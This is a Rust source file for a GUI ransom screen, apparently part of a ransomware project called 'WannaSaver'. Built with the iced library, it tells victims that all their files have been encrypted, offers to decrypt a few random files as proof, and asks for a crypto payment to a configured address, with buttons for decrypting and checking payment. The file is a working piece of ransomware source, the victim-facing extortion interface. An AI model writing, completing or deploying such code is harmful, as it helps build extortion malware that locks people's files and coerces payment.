use iced::{
    Color, Element, Length, Theme,
    widget::{
        button, column, container, row,
        scrollable, text, text_input, Space
    }
};

use crate::{
    WannaSaver,
    Message
};

use lib::config::control::{CRYPTO_ADDRESS, AMOUNT_MONEY};
use lib::config::config::MAX_DECRYPTABLE_FILES;

pub fn render(app: &WannaSaver) -> Element<Message> {
    let main_content: iced::widget::Row<'_, Message> = row![
        column![
            container(text(format!(
                "All your files have been encrypted. Thankfully, we let you decrypt {} random files to show that the decryption actually works.\nClick the \"try decryptor\" button to start decryption of the random files.\nIf you want to want to decrypt all files, send ${} in crypto to the address down below.\nPROGRAM WILL HANG WHILE CHECKING PAYMENTS.",
                MAX_DECRYPTABLE_FILES,
                AMOUNT_MONEY
            )).size(16))
            .width(Length::Fill)
            .height(Length::Fixed(200.0))
            .padding(20)
            .style(container_style),

            Space::with_height(20),

            column![
                text("address").size(18),
                text_input(CRYPTO_ADDRESS, &app.textbox_text)
                    .on_input(Message::TextChanged)
                    .padding(10)
                    .size(16)
            ]
            .spacing(10),

            Space::with_height(30),

            row![
                button("decrypt")
                    .on_press(Message::Decrypt)
                    .padding([12, 24])
                    .style(iced::theme::Button::Destructive),

                button("check payment")
                    .on_press(Message::CheckPayment)
                    .padding([12, 24])
                    .style(iced::theme::Button::Destructive),

                button("try decryptor")
                    .on_press(Message::TryDecrypt)
                    .padding([12, 24])
                    .style(iced::theme::Button::Destructive),
            ]
            .spacing(20)
            .width(Length::Fill)
        ]
        .width(Length::FillPortion(2))
        .padding(20),

        container(scrollable(column(
            app.console_logs
                .iter()
                .map(|log| text(log).size(14).into())
                .collect()
        ).spacing(5).padding(15)).height(Length::Fill))
        .width(Length::FillPortion(1))
        .height(Length::Fixed(400.0))
        .style(console_style)
    ]
    .spacing(20);

    container(main_content)
        .width(Length::Fill)
        .height(Length::Fill)
        .padding(20)
        .style(main_style)
        .into()
}

fn main_style(_theme: &Theme) -> container::Appearance {
    container::Appearance {
        background: Some(Color::from_rgb(0.1, 0.1, 0.1).into()),
        text_color: Some(Color::WHITE),
        ..Default::default()
    }
}

fn container_style(_theme: &Theme) -> container::Appearance {
    container::Appearance {
        background: Some(Color::from_rgb(0.15, 0.15, 0.15).into()),
        border_radius: 5.0.into(),
        border_width: 1.0,
        border_color: Color::from_rgb(0.3, 0.3, 0.3),
        text_color: Some(Color::WHITE),
        ..Default::default()
    }
}

fn console_style(_theme: &Theme) -> container::Appearance {
    container::Appearance {
        background: Some(Color::from_rgb(0.05, 0.05, 0.05).into()),
        border_radius: 5.0.into(),
        border_width: 2.0,
        border_color: Color::from_rgb(0.8, 0.2, 0.2),
        text_color: Some(Color::WHITE),
        ..Default::default()
    }
}